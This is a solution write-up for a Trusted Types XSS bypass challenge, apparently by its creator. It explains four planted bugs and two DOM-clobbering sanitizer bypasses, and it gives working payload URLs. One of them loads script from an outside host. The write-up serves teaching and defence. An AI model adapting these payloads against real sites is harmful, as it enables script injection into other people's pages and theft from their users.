# Trusted Types bypass challenge solutions

In the hope that people will read [my blog post](https://microsoftedge.github.io/edgevr/posts/eliminating-xss-with-trusted-types/), I've created this challenge 😋

## The Blob URL bug

```
<template id="contact">
    <p>If you found a bug in the S3, contact us with <a id="in_out_link" download>this file</a> on HackerOne!</p>
</template>
<script>
...

let in_out_link = document.getElementById('in_out_link');
if (!in_out_link) {
  const contact_df = document.getElementById('contact').content.cloneNode(true);
  document.querySelector('footer').appendChild(contact_df);
  in_out_link = document.getElementById('in_out_link');
}
const html = `<h2>Input:</h2><br><textarea>${dirty}</textarea><br><h2>Output:</h2><br><div>${outDiv.innerHTML}<div>`;
const blob = new Blob([html], {type: 'text/html'});
const url = URL.createObjectURL(blob);
in_out_link.href = url;

...
</script>
```

The contruction of above Blob URL is vulnerable to XSS, as dirty input goes inside `<textarea>`. With a payload like `<a class="</textarea><img src=x onerror=alert(origin)>">click</a>`, you can break out of `<textarea>` and trigger an XSS.
However, the link has `download` attribute specified, which will force it to download instead of rendering. Which will break the rule of this challenge to execute script in the challenge origin.
But, since an `<a>` tag is allowed in the sanitizer, you can simply pass `<a>` tag with `in_out_link` id, and you can navigate to it without triggering the download.

[https://shhnjk.github.io/challenge/tt/TrustedTypesBypassChallenge.html?code=%3Ca%20id=in_out_link%20class=%22%3C/textarea%3E%3Cimg%20src=x%20onerror=alert(origin)%3E%22%3EClick%20me%3C/a%3E](https://shhnjk.github.io/challenge/tt/TrustedTypesBypassChallenge.html?code=%3Ca%20id=in_out_link%20class=%22%3C/textarea%3E%3Cimg%20src=x%20onerror=alert(origin)%3E%22%3EClick%20me%3C/a%3E)

Wait, but shouldn't Trusted Types block this? Read [this section](https://microsoftedge.github.io/edgevr/posts/eliminating-xss-with-trusted-types/#blob-url) on my blog post for the explanation 😉


## The import bug

```
if (window.name == "debug") {
  import(`${window.debugFileName}`);
}
```

This one is super simple 😊

`data:text/html,<iframe src="https://shhnjk.github.io/challenge/tt/TrustedTypesBypassChallenge.html?code=<a id=debugFileName href='https://attack.shhnjk.com/alert.js'>" name=debug>`

Read [this section](https://microsoftedge.github.io/edgevr/posts/eliminating-xss-with-trusted-types/#script-loading-like-import) on my blog post for the explanation 😉

## The JavaScript URL bug

```
<script>
let params = new URLSearchParams(location.search);

...

const discount_url = params.get('coupon');
if (discount_url) {
  document.getElementById('sales').href = discount_url;
}

...
</script>
<a href="https://images.app.goo.gl/Bq9znUmASj3E8MiS7" id="sales" target="blank">Contact Sales</a>
```

Only few people solved this bug, even though many people guessed that `discount_url` is the XSS sink. While `javascript:` URL can be set to the _sales_ link, the navigation to it will be blocked by Trusted Types.
This is the key. If you can navigate to `javascript:` URL where Trusted Types isn't enforced, you won't get blocked 😎
If you look closely, the developer made a typo here in the `target` attribute of the _sales_ link. Since we can create an iframe, we can point an iframe to the `parse_html_subset.js` file, and there shouldn't be a Trusted Types enforcement on that page!
But, too early to get happy. The `name` attribute isn't allowed in the sanitizer... Sh💩t. 

Well, in Chrome, you can set the name inside an iframe, and it can be now targeted 😊 So putting all together, following is the solution.

[https://shhnjk.github.io/challenge/tt/TrustedTypesBypassChallenge.html?code=%3Ciframe%20src=%22https://vuln.shhnjk.com/xssable.php?xss=%3Cscript%3Ewindow.name=%27blank%27;location.href=%27https://shhnjk.github.io/challenge/tt/parse_html_subset.js%27%3C/script%3E%22%3E&coupon=javascript:alert(origin)](https://shhnjk.github.io/challenge/tt/TrustedTypesBypassChallenge.html?code=%3Ciframe%20src=%22https://vuln.shhnjk.com/xssable.php?xss=%3Cscript%3Ewindow.name=%27blank%27;location.href=%27https://shhnjk.github.io/challenge/tt/parse_html_subset.js%27%3C/script%3E%22%3E&coupon=javascript:alert(origin))

BTW, [alex](https://twitter.com/insertScript) came up with a slightly different solution. He framed 2 pages where one would point to payload page, and another point to `parse_html_subset.js` page with `<iframe>`'s `name` attribute set to `blank`. This was a clever solution 😀

`data:text/html,<iframe src="https://shhnjk.github.io/challenge/tt/parse_html_subset.js" name="blank"></iframe><iframe height="500" width="500" src="https://shhnjk.github.io/challenge/tt/TrustedTypesBypassChallenge.html?coupon=javascript:alert(origin)"></iframe>`

Read [this section](https://microsoftedge.github.io/edgevr/posts/eliminating-xss-with-trusted-types/#cross-document-vectors) on my blog post for the explanation 😉

## The sanitizer bug

People may have noticed that I used [parse_html_subset.js](https://source.chromium.org/chromium/chromium/src/+/master:ui/webui/resources/js/parse_html_subset.js;drc=cde9cbd148fe2c069a7a4c98cfd9ffa3b3ae502a) from Chromium repo.
However, I have added more allowed tags to introduce a bug ([Diff](https://www.diffchecker.com/ub73NtUr)). Namely, the `<template>` tag. A `<template>` tag has to be carefully handled in an HTML sanitization, as you'd have to access `HTMLTemplateElement.content` to iterate through the _DocumentFragement_ inside a `<template>` tag. Since _parse_html_subset.js_ wasn't written to handle `<template>` tag, this would result in dirty HTML injection. But this doesn't result in an XSS yet, because scripts inside a `<template>` tag won't get executed. Luckily, there is a code in the challenge which take contents of `<template>` tag with `contact` id. 

Therefore, following is the solution.

[https://shhnjk.github.io/challenge/tt/TrustedTypesBypassChallenge.html?code=%3Ctemplate%20id=%22contact%22%3E%3Cimg%20src=x%20onerror=alert(origin)%3E%3C/template%3E](https://shhnjk.github.io/challenge/tt/TrustedTypesBypassChallenge.html?code=%3Ctemplate%20id=%22contact%22%3E%3Cimg%20src=x%20onerror=alert(origin)%3E%3C/template%3E)

This bug has nothing to do with Trusted Types, as this sanitizer was allowed by Trusted Types header in the challenge page. But this is just a reminder that a DOM XSS will still be introduced if the sanitizer allowed by a Trusted Types policy is unsafe.

## Unintentional sanitizer bypasses

When I modified [parse_html_subset.js](https://source.chromium.org/chromium/chromium/src/+/master:ui/webui/resources/js/parse_html_subset.js;drc=cde9cbd148fe2c069a7a4c98cfd9ffa3b3ae502a), I added bunch of _safe_ tags from [DOMPurify](https://github.com/cure53/DOMPurify), just to hide the fact that I've added the `<template>` tag. Obviously, some clever people have took this fact to their advantage 😂

[Michał Bentkowski](https://twitter.com/SecurityMB) found out that with a `<form>` tag, he can perform a DOM Clobbering to hide dangerous attributes from the sanitizer's parser, when there is an element with `id=attributes`.

Vulnerable code:

```
switch (node.nodeType) {
    case Node.ELEMENT_NODE:
      assertElement(tags, node);
      const nodeAttrs = node.attributes; <--- OMG
      for (let i = 0; i < nodeAttrs.length; ++i) {
        assertAttribute(attrs, nodeAttrs[i], node);
      }
      break;

    case Node.COMMENT_NODE:
    case Node.DOCUMENT_FRAGMENT_NODE:
    case Node.TEXT_NODE:
      break;

    default:
      throw Error('Node type ' + node.nodeType + ' is not supported');
}

```

[https://shhnjk.github.io/challenge/tt/TrustedTypesBypassChallenge.html?code=%3Cform%20onclick=%22alert(origin);return%20false%22%3E%3Cimg%20id=attributes%3E%3Ca%20href=https://a%3EClick%20here%3C/a%3E](https://shhnjk.github.io/challenge/tt/TrustedTypesBypassChallenge.html?code=%3Cform%20onclick=%22alert(origin);return%20false%22%3E%3Cimg%20id=attributes%3E%3Ca%20href=https://a%3EClick%20here%3C/a%3E)

Similarly, [TheGrandPew](https://twitter.com/PewGrand) and [alex](https://twitter.com/insertScript) found out that with a `<form>` tag, they can perform a DOM Clobbering to hide dangerous tags from the sanitizer's parser, when there is an element with `id=childNodes`.

Vulnerable code:

```
function walk(n, f) {
  f(n);
  for (let i = 0; i < n.childNodes.length; i++) {
    walk(n.childNodes[i], f);
  }
}
```

[https://shhnjk.github.io/challenge/tt/TrustedTypesBypassChallenge.html?code=%3Cform%3E%3Cinput%20id=childNodes%3E%3Cimg%20src=x%20onerror=alert(origin)%3E%3C/form%3E](https://shhnjk.github.io/challenge/tt/TrustedTypesBypassChallenge.html?code=%3Cform%3E%3Cinput%20id=childNodes%3E%3Cimg%20src=x%20onerror=alert(origin)%3E%3C/form%3E)

These were amazing bugs, and while I could consider these bugs as 5th or 6th bugs, I decided to treat these bugs and the intended sanitizer bypass as 1 bug for the sake of this challenge. However, since these bugs deserve a credit, I made another list for honorable mentions 😊

Hope you enjoyed the challenge!
